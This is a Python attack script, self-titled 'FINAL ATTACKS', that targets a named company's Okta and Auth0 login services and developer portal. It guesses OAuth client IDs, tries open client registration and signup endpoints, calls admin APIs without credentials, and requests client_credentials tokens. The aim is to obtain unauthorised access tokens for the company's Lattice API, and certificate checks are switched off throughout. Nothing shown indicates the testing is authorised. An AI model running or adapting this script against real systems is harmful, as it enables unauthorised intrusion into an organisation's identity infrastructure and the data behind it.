#!/usr/bin/env python3
"""
FINAL ATTACKS:
1. Okta PKCE flow with andurilext.okta.com/oauth2/default
2. Auth0 OIDC registration endpoint
3. Probe for any publicly accessible Lattice sandbox token
4. Check andurilext.okta.com for exposed APIs/scopes
"""
import requests, json, base64, hashlib, secrets, re
requests.packages.urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
S = requests.Session(); S.verify = False

andurilext = "https://andurilext.okta.com"
auth0 = "https://anduril.us.auth0.com"
pg = "https://proving-ground.anduril.com"

print("=" * 70)
print("1. PROBE andurilext.okta.com DEFAULT AUTH SERVER - find API audience")
print("=" * 70)

# Fetch the default auth server's full OIDC config to get audience hints
r = S.get(f"{andurilext}/oauth2/default/.well-known/openid-configuration",
          headers={"User-Agent": UA}, timeout=10)
config = r.json()
print(f"  Full OIDC config:")
print(json.dumps(config, indent=2)[:3000])

# Also fetch auth server metadata  
for path in ["/api/v1/meta/types/apps", "/api/v1/apps", "/api/v1/authorizationServers"]:
    r2 = S.get(f"{andurilext}{path}", headers={"User-Agent": UA, "Accept": "application/json"}, timeout=8)
    print(f"\n  GET {path}: {r2.status_code}")
    if r2.status_code == 200:
        print(f"  {r2.text[:500]}")
    elif r2.status_code == 401:
        print(f"  401: {r2.text[:200]}")

print("\n" + "=" * 70)
print("2. OKTA PKCE AUTHORIZATION CODE FLOW")
print("=" * 70)
print("Try to get authorization code with PKCE - no client_secret needed!")

# Generate PKCE verifier
code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b'=').decode()
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).rstrip(b'=').decode()

print(f"  PKCE verifier: {code_verifier[:30]}...")
print(f"  PKCE challenge: {code_challenge[:30]}...")

# Try auth code flow with PKCE for various client_ids
# Okta assigns client IDs that start with "0oa" 
# Common patterns: demo-apps, developer-portal clients
for client_id in ["anduril", "developer", "0oatest", "sandbox", "lattice-dev"]:
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": "https://localhost/callback",
        "scope": "openid profile email offline_access",
        "state": "state123",
        "code_challenge": code_challenge,
        "code_challenge_method": "S256"
    }
    r = S.get(f"{andurilext}/oauth2/default/v1/authorize",
              params=params,
              headers={"User-Agent": UA},
              timeout=8, allow_redirects=False)
    print(f"  client_id={client_id}: [{r.status_code}] {r.headers.get('Location','')[:200]}")
    if r.status_code not in [302, 303, 400]:
        print(f"  Body: {r.text[:300]}")

print("\n" + "=" * 70)
print("3. AUTH0 OIDC REGISTRATION ENDPOINT")
print("=" * 70)
print("Try to register an application on anduril.us.auth0.com")

# Auth0 OIDC registration (dynamic client registration per RFC 7591)
# This typically requires an initial access token, but some tenants allow open registration
dcr_payload = {
    "client_name": "test-researcher",
    "grant_types": ["client_credentials"],
    "token_endpoint_auth_method": "none",
    "application_type": "service"
}
r = S.post(f"{auth0}/oidc/register",
           json=dcr_payload,
           headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
           timeout=10)
print(f"  Auth0 OIDC register: {r.status_code}")
print(f"  {r.text[:500]}")

# Try Auth0 management API
r2 = S.get(f"{auth0}/api/v2/clients",
           headers={"User-Agent": UA, "Accept": "application/json"},
           timeout=10)
print(f"\n  Auth0 API v2 clients: {r2.status_code}")
print(f"  {r2.text[:300]}")

# Check what scopes Auth0 supports that might be for Lattice
r3 = S.get(f"{auth0}/api/v2/resource-servers",
           headers={"User-Agent": UA, "Accept": "application/json"},
           timeout=10)
print(f"\n  Auth0 resource servers: {r3.status_code}")
print(f"  {r3.text[:300]}")

print("\n" + "=" * 70)
print("4. PROBE developer.anduril.com FOR REGISTRATION/SIGNUP")
print("=" * 70)

# Check if developer.anduril.com has open registration
for path in ["/signup", "/register", "/api/v1/signup", "/api/v1/register", 
             "/api/v1/users", "/api/auth/register"]:
    for method in ["GET", "POST"]:
        r = S.request(method, f"https://developer.anduril.com{path}",
                      json={"email": "test@test.com"},
                      headers={"User-Agent": UA, "Accept": "application/json",
                               "Content-Type": "application/json"},
                      timeout=8, allow_redirects=False)
        if r.status_code not in [404, 307, 200, 302, 301] or method == "POST":
            print(f"  {method} {path}: [{r.status_code}] {r.text[:200]}")

print("\n" + "=" * 70)
print("5. ATTEMPT OPEN OKTA DYNAMIC CLIENT REGISTRATION ON andurilext.okta.com")
print("=" * 70)

# Check if andurilext.okta.com allows DCR 
r = S.post(f"{andurilext}/oauth2/v1/clients",
           json={
               "client_name": "test-app",
               "grant_types": ["client_credentials"],
               "response_types": ["token"],
               "token_endpoint_auth_method": "none",
               "application_type": "service"
           },
           headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
           timeout=10)
print(f"  DCR on andurilext.okta.com: {r.status_code}")
print(f"  {r.text[:500]}")

# Also try the default auth server registration endpoint
r2 = S.post(f"{andurilext}/oauth2/default/v1/clients",
            json={"client_name": "test", "grant_types": ["client_credentials"],
                  "token_endpoint_auth_method": "none"},
            headers={"User-Agent": UA, "Content-Type": "application/json"},
            timeout=10)
print(f"\n  DCR on default auth server: {r2.status_code}")
print(f"  {r2.text[:300]}")

print("\n" + "=" * 70)
print("6. PROBE andurilext.okta.com FOR PUBLIC APPLICATION CLIENT IDs")
print("=" * 70)
print("Try to find a public (no client_secret) app that can get access tokens")

# Okta assigns client IDs starting with "0oa" followed by 20 chars
# Try common words as Okta client IDs
for cid in ["developer", "anduril", "lattice", "sandbox", "catalog"]:
    # PKCE flow attempt
    r = S.get(f"{andurilext}/oauth2/default/v1/authorize",
              params={"response_type": "code", "client_id": cid,
                      "redirect_uri": "https://localhost/callback",
                      "scope": "openid", "state": "x",
                      "code_challenge": code_challenge, "code_challenge_method": "S256"},
              headers={"User-Agent": UA}, timeout=8, allow_redirects=False)
    print(f"  client_id={cid}: [{r.status_code}]", end="")
    if r.status_code == 302:
        loc = r.headers.get('Location', '')
        if 'error' in loc:
            err_match = re.search(r'error=([^&]+)', loc)
            print(f" error={err_match.group(1) if err_match else 'unknown'}")
        elif 'code' in loc:
            print(f" [HIT! Got code!]")
        else:
            print(f" {loc[:100]}")
    else:
        print(f" {r.text[:100]}")

print("\n" + "=" * 70)
print("7. OAUTH2 IMPLICIT FLOW ON andurilext.okta.com")
print("=" * 70)
print("Token endpoint direct client_credentials test with various client_ids")

# Try andurilext.okta.com token endpoint directly
# For public clients (none auth method), no client_secret needed
for aud in ["api://default", "lattice", "https://lattice.anduril.com", 
            "https://andurilext.okta.com"]:
    r = S.post(f"{andurilext}/oauth2/default/v1/token",
               data={
                   "grant_type": "client_credentials",
                   "client_id": "anduril",
                   "scope": "lattice",
                   "audience": aud
               },
               headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
                        "Accept": "application/json"},
               timeout=8)
    print(f"  aud={aud}: [{r.status_code}] {r.text[:200]}")

print("\n[DONE]")
